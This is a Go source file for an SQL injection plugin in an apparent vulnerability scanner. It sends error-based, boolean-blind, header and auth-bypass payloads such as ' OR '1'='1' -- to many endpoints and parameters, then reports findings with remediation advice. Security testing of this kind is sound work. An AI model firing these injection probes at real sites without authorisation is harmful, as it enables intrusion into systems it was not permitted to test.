package sqliengine

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// ============================================================
//  SQL INJECTION ENGINE — v6.0 "Omni-SQLi"
//  Error · UNION · Blind · Time · Header · POST · WAF-Adaptive
// ============================================================

type SQLInjectionPlugin struct{}

func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Omni-SQLi v5)" }

func (p *SQLInjectionPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !models.IsWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := models.GetURL(target, "")

	// Load WAF info
	wafType := models.GetSharedString(fmt.Sprintf("waf_type_%s", target.IP))

	endpoints := []string{
		"/", "/index.php", "/login.php", "/product.php", "/cart.php",
		"/news.php", "/search.php", "/item.php", "/view.php",
		"/Default.aspx", "/Login.aspx", "/Products.aspx", "/Details.aspx",
		"/login", "/signin", "/search", "/view", "/products", "/items",
	}

	params := []string{
		"id", "cat", "item", "u", "user", "q", "search", "query",
		"p", "pid", "article_id", "news_id", "page", "product_id",
		"order", "sort", "category", "ref",
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 1 — Error-Based SQLi (WAF-adaptive payloads)
	// ══════════════════════════════════════════════════════════════════════
	errorPayloads := GetErrorPayloads(wafType)

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range errorPayloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))
				resp, err := client.Get(targetURL)
				if err != nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()
				bodyStr := string(bodyBytes)

				for _, errMsg := range DBErrors {
					if strings.Contains(bodyStr, errMsg) {
						db := FingerprintDB(bodyStr)
						return &models.Vulnerability{
							Target:   target,
							Name:     "SQL Injection (Error-Based)",
							Severity: "CRITICAL",
							CVSS:     9.8,
							Description: fmt.Sprintf(
								"Database error triggered (Error-Based SQLi).\nURL: %s\nPayload: %s\nError Match: %s\nDetected DB: %s",
								targetURL, payload, errMsg, db,
							),
							Solution:  "Use Prepared Statements / Parameterized Queries.",
							Reference: "OWASP A03:2021 – Injection",
						}
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 2 — UNION-Based Detection
	// ══════════════════════════════════════════════════════════════════════
	unionResult := RunUnionDetection(client, baseURL, target, endpoints, params)
	if unionResult != nil {
		return unionResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 3 — Spider Endpoint Integration (GET + POST)
	// ══════════════════════════════════════════════════════════════════════
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					for _, payload := range errorPayloads {
						u, err := url.Parse(ep.URL)
						if err != nil {
							continue
						}
						q := u.Query()
						q.Set(param, payload)
						u.RawQuery = q.Encode()

						resp, err := client.Get(u.String())
						if err != nil {
							continue
						}
						bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
						resp.Body.Close()
						bodyStr := string(bodyBytes)

						for _, errMsg := range DBErrors {
							if strings.Contains(bodyStr, errMsg) {
								db := FingerprintDB(bodyStr)
								return &models.Vulnerability{
									Target:   target,
									Name:     "SQL Injection (Spider-Discovered Endpoint)",
									Severity: "CRITICAL",
									CVSS:     9.8,
									Description: fmt.Sprintf(
										"Database error triggered on spider-discovered endpoint.\nURL: %s\nParam: %s  Payload: %s\nError: %s  DB: %s",
										u.String(), param, payload, errMsg, db,
									),
									Solution:  "Use Prepared Statements.",
									Reference: "OWASP A03:2021 – Injection",
								}
							}
						}
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 4 — Header Injection SQLi
	// ══════════════════════════════════════════════════════════════════════
	headerResult := RunHeaderInjection(client, baseURL, target)
	if headerResult != nil {
		return headerResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 5 — Time-Based Blind SQLi
	// ══════════════════════════════════════════════════════════════════════
	timeResult := RunTimeBasedBlind(client, baseURL, target)
	if timeResult != nil {
		return timeResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 6 — POST / Auth Bypass
	// ══════════════════════════════════════════════════════════════════════
	postResult := RunPostAuthBypass(client, baseURL, target)
	if postResult != nil {
		return postResult
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 7 — Boolean-Based Blind SQLi (NEW)
	// ══════════════════════════════════════════════════════════════════════
	boolResult := runBooleanBlind(client, baseURL, target, endpoints, params)
	if boolResult != nil {
		return boolResult
	}

	return nil
}

// runBooleanBlind tests for boolean-based blind SQLi by comparing true/false responses.
func runBooleanBlind(client *http.Client, baseURL string, target models.ScanTarget, endpoints, params []string) *models.Vulnerability {
	truePayloads := []string{"' OR '1'='1' --", "' OR 1=1 --", "1 OR 1=1"}
	falsePayloads := []string{"' AND '1'='2' --", "' AND 1=2 --", "1 AND 1=2"}

	for _, ep := range endpoints[:min(len(endpoints), 5)] {
		for _, param := range params[:min(len(params), 5)] {
			// Baseline
			baseURL2 := fmt.Sprintf("%s%s?%s=1", baseURL, ep, param)
			baseResp, err := client.Get(baseURL2)
			if err != nil {
				continue
			}
			baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 65536))
			baseResp.Body.Close()
			baseSize := len(baseBody)

			for i, tp := range truePayloads {
				if i >= len(falsePayloads) {
					break
				}
				fp := falsePayloads[i]

				// True condition
				trueURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(tp))
				trueResp, err := client.Get(trueURL)
				if err != nil {
					continue
				}
				trueBody, _ := io.ReadAll(io.LimitReader(trueResp.Body, 65536))
				trueResp.Body.Close()
				trueSize := len(trueBody)

				// False condition
				falseURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(fp))
				falseResp, err := client.Get(falseURL)
				if err != nil {
					continue
				}
				falseBody, _ := io.ReadAll(io.LimitReader(falseResp.Body, 65536))
				falseResp.Body.Close()
				falseSize := len(falseBody)

				// True response should be similar to baseline, false should differ
				trueDiff := abs(trueSize - baseSize)
				falseDiff := abs(falseSize - baseSize)

				if trueDiff < 50 && falseDiff > 200 {
					return &models.Vulnerability{
						Target:   target,
						Name:     "Blind SQL Injection (Boolean-Based)",
						Severity: "CRITICAL",
						CVSS:     9.5,
						Description: fmt.Sprintf(
							"Boolean-based blind SQL injection confirmed.\n"+
								"True condition response matches baseline, false condition diverges significantly.\n\n"+
								"Endpoint: %s\nParameter: %s\n"+
								"True Payload: %s (size: %d, diff from base: %d)\n"+
								"False Payload: %s (size: %d, diff from base: %d)\n"+
								"Baseline size: %d",
							ep, param, tp, trueSize, trueDiff, fp, falseSize, falseDiff, baseSize,
						),
						Solution:  "Use Prepared Statements / Parameterized Queries.",
						Reference: "OWASP Blind SQL Injection",
					}
				}
			}
		}
	}
	return nil
}

func abs(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
